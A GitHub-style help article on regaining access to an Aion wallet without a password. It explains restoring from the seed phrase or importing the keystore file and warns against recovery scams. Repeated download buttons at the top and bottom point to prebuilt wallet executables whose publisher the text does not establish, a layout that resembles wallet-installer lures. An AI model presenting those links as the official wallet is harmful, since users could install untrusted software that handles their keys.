![Aion Wallet](assets/banner-article.png)

# Aion wallet forgot password: the honest options

A non-custodial AION wallet for Windows, macOS, Linux, with keys on your own machine.

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

> **Only download from this GitHub release page.**

There is no password reset in Aion Wallet: the password only unlocks a keystore file, so getting back in means restoring from your 12-word or 24-word seed phrase, or importing the keystore file whose password you still remember.

Nothing in the application stores a copy of the password, and no support channel can issue a new one. The wallet is non-custodial, which is exactly why that is true and exactly why the recovery phrase exists.

## You'll see this if

- The login screen rejects a password you are certain about.
- You restored an old keystore file and cannot remember what you set at the time.
- You reinstalled the application and the new installation asks for a password the old one never asked for.
- You have the wallet address and the balance is visible on an explorer, but the local file will not open.

If the screen instead reports a connection problem, that is a different fault: start with the [Aion wallet not syncing](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-not-syncing.md) guide.

## Why there is no reset

A keystore file is an encrypted private key. The password is the input to the decryption, not a credential checked against a server, so there is nowhere for a reset to happen. Even the application's own "failed to unlock" message is a statement about decryption, not about whether the password is close.

This is the same model every non-custodial wallet uses, and it is worth stating plainly because the alternative is a whole category of scam. Any service that offers to reset an Aion wallet password, or to recover a wallet for a fee, is either guessing simple passwords or taking your money.

## Path one: restore from the seed phrase

If you wrote down the phrase, you do not need the password at all.

1. Install the current release from the release page.
2. Choose the restore option rather than creating a new wallet.
3. Enter the 12 or 24 words in the original order.
4. Set a new password for the new local keystore.
5. Confirm that the restored address matches the one you expect, character for character at the start and the end.

The restored wallet derives the same addresses from the same phrase, so the balance appears once the client has reached a node. If it does not, the phrase may belong to a different wallet, or the account you are looking for was created separately from the restored one.

## Path two: import the keystore file

If you have the keystore file and remember its password, the wallet can be opened without the phrase.

1. Keep the file exactly as it was exported; do not open and re-save it in an editor.
2. Use the import option in the current release and select the file.
3. Enter the password that was set when the file was created.
4. Set a new password for the imported account once it opens.

A keystore file is often accompanied by a JSON backup or a `.txt` note with the same content. Either is fine as long as the bytes are unchanged.

## If neither is available

Without the phrase or an unlocked keystore file, the funds at that address cannot be accessed. That is not a policy the project can waive; it is what non-custodial means.

There are two things worth doing before concluding that. Check every place a backup could plausibly be: paper, a printed PDF, an old drive, a password manager entry that stores the file rather than the words. And check whether the coins were ever on an exchange, because a balance held there belongs to an account you can still recover through that service, not to the local wallet.

What not to do is send the keystore file, or a fragment of the phrase, to anyone offering help. A person who receives those can take the funds, and the offer is the theft.

If you are deciding who to ask for help with the rest of the problem, the [Aion wallet support](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-support.md) guide sets out what a legitimate channel can and cannot do with a locked wallet.

## Prevention

Write the phrase on paper at the moment it is shown, and store a second copy somewhere physically separate. Do not photograph it, and do not keep it in a synced note.

Export a keystore file once the wallet is working, record its password somewhere you would look in a year, and keep the file offline. The two backups fail in different ways, which is the point of having both.

When you create a new password, use a passphrase you can reproduce rather than a random string you will not. The [Aion keystore file restore](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-keystore-file-restore.md) article covers what a keystore actually protects.

## Frequently asked questions

### Can Aion support reset my password?

No. No one holds your password or a copy of your key, so there is nothing to reset.

### I have the seed phrase but the address is different. Why?

A phrase restores only the accounts derived from it. If the missing account was created separately, it needs its own keystore file; the [Aion wallet login options](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-login-options.md) guide explains the cases.

### Is it safe to type my seed phrase into the wallet after a reinstall?

Only into the wallet you installed from the official release page, and only on a machine you trust. Never into a website, a chat window or a form someone sent you.

### Can a password cracker open my keystore file?

It can try, which is why a short or reused password is a real risk. A long passphrase makes the attempt impractical; there is no shortcut that makes it legitimate.

## Download Aion Wallet

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

## Related articles

- [Aion keystore file restore](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-keystore-file-restore.md) - what the file holds and how to import it.
- [Aion wallet login options](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-login-options.md) - all three ways back into a wallet.
- [Aion Aiwa wallet recovery](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-aiwa-wallet-recovery.md) - the same phrase route out of a retired extension.
- [Aion wallet with Ledger](https://github.com/aion-wallet/aion-wallet-help/blob/main/aion-wallet-with-ledger.md) - when the key never sat on the computer at all.
